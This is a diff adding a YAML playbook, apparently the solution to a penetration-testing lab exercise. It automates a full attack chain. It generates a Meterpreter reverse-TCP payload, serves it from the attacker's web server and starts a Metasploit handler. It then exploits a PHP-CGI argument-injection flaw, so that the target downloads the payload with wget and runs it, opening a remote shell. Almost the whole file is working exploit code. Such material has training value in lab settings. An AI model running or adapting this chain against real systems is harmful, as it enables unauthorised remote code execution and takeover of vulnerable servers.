@@ -1,0 +1,85 @@
+#
+# Exercise 2 Solution: Payload Generation and Delivery via webserv
+#
+
+vars:
+  TARGET: 172.17.0.106
+  ATTACKER: 172.17.0.127
+  PAYLOAD: linux/x86/meterpreter/reverse_tcp
+  LPORT: "4344"
+  WEBSERV_PORT: "8080"
+  PHP_RCE_URL: "http://172.17.0.106/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"
+
+commands:
+  # PHASE 1: Generate the Payload
+
+  - type: mktemp
+    cmd: file
+    variable: PAYLOAD_FILE
+
+  - type: msf-payload
+    cmd: $PAYLOAD
+    format: elf
+    local_path: $PAYLOAD_FILE
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+
+  - type: debug
+    cmd: "Payload generated at: $PAYLOAD_FILE"
+
+  # PHASE 2: Serve and Listen
+
+  - type: webserv
+    local_path: $PAYLOAD_FILE
+    port: $WEBSERV_PORT
+    background: True
+    kill_on_exit: True
+
+  - type: sleep
+    seconds: 1
+
+  - type: msf-module
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    creates_session: shell
+    background: True
+    kill_on_exit: True
+
+  # PHASE 3: Trigger the Exploit
+
+  - type: shell
+    cmd: >-
+      curl -s -XPOST "$PHP_RCE_URL"
+      -d "<?php system('wget -O /tmp/shell http://${ATTACKER}:${WEBSERV_PORT}/${PAYLOAD_FILE}')?>"
+
+  - type: sleep
+    seconds: 2
+
+  - type: shell
+    cmd: >-
+      curl -s -XPOST "$PHP_RCE_URL"
+      -d "<?php system('chmod +x /tmp/shell && /tmp/shell &')?>"
+    background: True
+    kill_on_exit: True
+
+  - type: sleep
+    seconds: 3
+
+  # PHASE 4: Post-Exploitation
+
+  - type: msf-session
+    session: shell
+    stdapi: True
+    cmd: sysinfo
+
+  - type: msf-session
+    session: shell
+    stdapi: True
+    cmd: getuid
+
+  - type: debug
+    cmd: "Current user: $RESULT_STDOUT"
